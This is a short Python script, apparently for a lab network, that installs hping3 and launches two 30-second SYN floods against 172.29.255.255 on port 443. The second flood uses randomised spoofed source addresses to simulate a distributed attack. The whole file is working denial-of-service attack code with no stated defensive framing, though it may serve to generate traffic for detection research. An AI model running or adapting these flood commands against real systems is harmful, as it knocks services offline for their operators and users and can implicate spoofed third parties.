# Send both DoS and DDoS SYN flood attacks using hping3
import os
import subprocess
import time
import signal

os.system("apk update && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hping3")
os.system("hping3 -S 172.29.255.255 -p 443 -I eth1 --flood &") # DoS
time.sleep(30)
os.system("pkill hping")
time.sleep(10)
os.system("hping3 -S 172.29.255.255 -p 443 -I eth1 --flood --rand-source &") # DDoS
time.sleep(30)
os.system("pkill hping")